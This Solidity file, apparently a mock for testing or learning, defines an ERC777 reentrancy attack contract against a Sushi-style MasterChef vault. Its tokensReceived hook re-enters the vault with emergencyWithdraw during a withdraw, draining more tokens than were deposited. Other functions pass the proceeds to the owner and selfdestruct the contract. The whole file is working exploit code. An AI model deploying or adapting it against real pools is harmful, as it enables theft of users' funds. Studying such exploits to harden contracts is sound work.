// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;
import "./MockERC777.sol";
import "./MasterChef.sol";

contract MockERC777Attack is IERC777Recipient {
    bytes32 private constant _TOKENS_RECIPIENT_INTERFACE_HASH =
        keccak256("ERC777TokensRecipient");
    IERC20 token;
    IERC1820Registry internal registry;
    IMasterChef public vault; // Sushi MasterChef
    address public owner;

    constructor(
        IERC20 _token,
        IERC1820Registry _registry,
        IMasterChef _vault
    ) public {
        vault = IMasterChef(_vault);
        token = IERC20(_token);
        registry = IERC1820Registry(_registry);
        owner = msg.sender;
        // what's the usage of registry and _TOKENS_RECIPIENT_INTERFACE_HASH?
        registry.setInterfaceImplementer(
            address(this),
            _TOKENS_RECIPIENT_INTERFACE_HASH,
            address(this)
        );
    }

    // IERC777Recipient 中需要实现的function，否则这个合约需要标记为抽象合约
    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external override {
        require(owner == tx.origin, "no permission");
        if (
            operator == address(vault) &&
            from == address(vault) &&
            to == address(this)
        ) {
            uint balance = token.balanceOf(address(vault));
            if (balance >= amount) {
                vault.emergencyWithdraw(0);
            }
        }
    }

    function approve(address spender, uint256 amount) external {
        // deposit need enough allowance: transfer from this contract to vault
        token.approve(spender, amount);
    }

    function depositAll() public {
        require(owner == msg.sender, "Only owner can deposit");
        uint balance = token.balanceOf(address(this));
        vault.deposit(0, balance);
    }

    function withdrawAttack(uint256 _amount) public {
        require(owner == msg.sender, "Only owner can widthdraw");
        vault.withdraw(0, _amount);
        uint balance = token.balanceOf(address(this));
        token.transfer(msg.sender, balance);
        selfdestruct(payable(msg.sender));
    }

    function withdrawAllAttack() public {
        require(owner == msg.sender, "Only owner can widthdraw");
        vault.emergencyWithdraw(0);
        uint balance = token.balanceOf(address(this));
        token.transfer(msg.sender, balance);
        selfdestruct(payable(msg.sender));
    }
}
